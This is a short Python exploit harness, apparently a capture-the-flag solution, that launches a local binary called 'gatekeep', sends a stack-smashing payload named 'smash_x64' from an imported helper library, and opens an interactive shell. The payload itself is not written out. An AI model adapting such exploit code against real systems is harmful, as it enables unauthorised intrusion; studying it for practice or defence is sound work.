#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./gatekeep")
host = args.HOST or "127.0.0.1"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

sl(smash_x64)

io.interactive()
